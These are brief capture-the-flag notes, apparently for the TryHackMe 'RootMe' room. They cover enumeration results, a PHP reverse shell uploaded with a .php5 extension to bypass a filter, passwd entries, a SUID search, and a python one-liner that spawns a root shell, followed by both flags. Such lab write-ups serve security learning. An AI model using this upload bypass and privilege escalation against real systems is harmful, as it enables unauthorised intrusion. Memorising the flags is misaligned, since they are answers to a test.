/uploads
/css
/js
/panel - file upload
/server-status

22: ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80: http Apache/2.4.29 (Ubuntu)

pentestmonkey rev shell script.
reverse shell rip2.php5 passed

priv esc:
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
test:x:1001:1001:,,,:/home/test:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

ssh test@<ip> psw: test
"Sorry, user test may not run sudo on rootme."


find / -user root -perm /4000
/usr/bin/python


/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")' == root
root/root.txt THM{pr1v1l3g3_3sc4l4t10n}

find / user.txt | grep 'user.txt'
/var/www/user.txt THM{y0u_g0t_a_sh3ll}
